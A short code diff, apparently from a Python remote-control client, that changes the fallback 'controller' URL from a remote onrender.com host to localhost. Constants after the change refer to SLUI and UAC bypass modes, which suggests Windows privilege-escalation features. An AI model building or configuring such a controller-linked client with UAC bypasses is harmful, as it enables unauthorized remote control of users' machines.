@@ -784,13 +784,13 @@ def _resolve_controller_url():
     candidates = [
         v1,
         v2,
-        'https://neural-control-hub.onrender.com',
+        'http://127.0.0.1:8080',
         'http://localhost:3000'
     ]
     for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'https://neural-control-hub.onrender.com'
+    return 'http://127.0.0.1:8080'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
